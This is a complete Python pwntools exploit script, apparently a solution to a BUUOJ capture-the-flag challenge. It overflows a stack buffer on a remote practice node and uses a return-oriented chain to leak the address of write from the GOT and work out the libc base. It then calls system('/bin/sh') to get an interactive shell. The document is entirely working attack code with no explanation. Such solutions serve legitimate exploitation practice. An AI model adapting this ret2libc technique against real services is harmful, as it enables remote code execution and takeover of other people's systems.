from pwn import *
#context.log_level="debug"
#sh=process("./timu")
sh=remote("node5.buuoj.cn",26187)
elf=ELF("./timu")
libc=ELF("./libc-2.23.so")
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

pop_rdi_ret=0x00000000004006b3
pop_rsi_ret=0x00000000004006b1
write_offset=libc.symbols["write"]
main=0x00000000004005E6
write_plt=elf.plt["write"]
write_got=elf.got["write"]

payload=0x88*b'a'+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(write_got)+p64(0)+p64(write_plt)+p64(main)
sh.recvuntil(b"Input:\n")
sh.send(payload)
write_addr=u64(sh.recv(8))
print("write_addr=",hex(write_addr))
libc_base=write_addr-write_offset
system_addr=libc_base+libc.symbols["system"]
binsh=libc_base+next(libc.search(b"/bin/sh"))
sh.recvuntil(b"Input:\n")
payload=0x88*b'a'+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)+0x8*b'a'
sh.send(payload)
sh.interactive()
